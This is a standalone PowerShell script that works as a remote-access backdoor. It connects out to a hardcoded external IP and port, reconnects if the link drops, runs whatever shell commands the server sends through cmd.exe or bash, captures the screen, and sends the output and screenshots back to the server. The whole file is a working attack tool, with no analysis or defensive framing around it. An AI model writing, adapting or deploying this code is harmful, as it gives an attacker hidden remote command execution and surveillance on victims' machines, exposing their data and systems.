# Configuration parameters
$serverAddress = "147.185.221.21"
$serverPort = 44468
$connectRetryInterval = 3000

# Function to connect to server
function Connect-ToServer {
    $global:client = New-Object System.Net.Sockets.TcpClient
    while ($true) {
        try {
            $client.Connect($serverAddress, $serverPort)
            Write-Host "Connected to server."
            return $client
        } catch {
            Write-Host "Error connecting to server: $_"
            Start-Sleep -Milliseconds $connectRetryInterval
        }
    }
}

# Function to listen for commands from the server
function Start-Listening {
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $buffer = New-Object System.Byte[] 1024
    try {
        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
            Write-Host "Received command: $command"
            Execute-Command $command
        }
    } catch {
        Write-Host "Lost connection to server: $_"
        $client.Close()
        Connect-ToServer
        Start-Listening
    }
}

# Function to execute received commands
function Execute-Command($command) {
    switch -Regex ($command) {
        'shell (.*)' {
            Execute-ShellCommand $Matches[1]
        }
        'getsysinfo' {
            Send-Data (Get-SystemInfo)
        }
        'screenshot' {
            $screenshot = Capture-ScreenToBase64
            Send-Data "screenshot $screenshot"
        }
        'close' {
            exit
        }
        default {
            Send-Data "Unknown command type."
        }
    }
}

# Function to execute shell commands based on the OS
function Execute-ShellCommand($command) {
    if ([System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)) {
        $shell = "cmd.exe"
        $shellArgs = "/c $command"
    } else {
        $shell = "/bin/bash"
        $shellArgs = "-c '$command'"
    }

    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $shell
    $processInfo.Arguments = $shellArgs
    $processInfo.RedirectStandardOutput = $true
    $processInfo.RedirectStandardError = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processInfo
    $process.Start() | Out-Null
    $output = $process.StandardOutput.ReadToEnd()
    $errors = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    $response = "Output: $output"
    if ($errors) {
        $response += "`nErrors: $errors"
    }
    Send-Data $response
}

# Function to send data to the server
function Send-Data($data) {
    if ($client.Connected) {
        $stream = $client.GetStream()
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($data)
        $stream.Write($buffer, 0, $buffer.Length)
        Write-Host "Sent data to server: $data"
    } else {
        Write-Host "Not connected to server."
    }
}

# Function to get system information
function Get-SystemInfo {
    return "System Info: CPU Usage, Memory Usage, etc."
}

# Function to capture a screenshot and return as base64 string, cross-platform
function Capture-ScreenToBase64 {
    if ([System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)) {
        Add-Type -AssemblyName System.Drawing
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    } else {
        $script = "screencapture -x -T 0 screenshot.png; cat screenshot.png | base64; rm screenshot.png"
        $encoded = & bash -c $script
        return $encoded
    }

    # Convert the image to a byte array (Windows)
    $memoryStream = New-Object System.IO.MemoryStream
    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
    $bitmap.Dispose()
    $graphics.Dispose()
    [Convert]::ToBase64String($memoryStream.ToArray())
}

# Main execution flow
$global:client = Connect-ToServer
Start-Listening
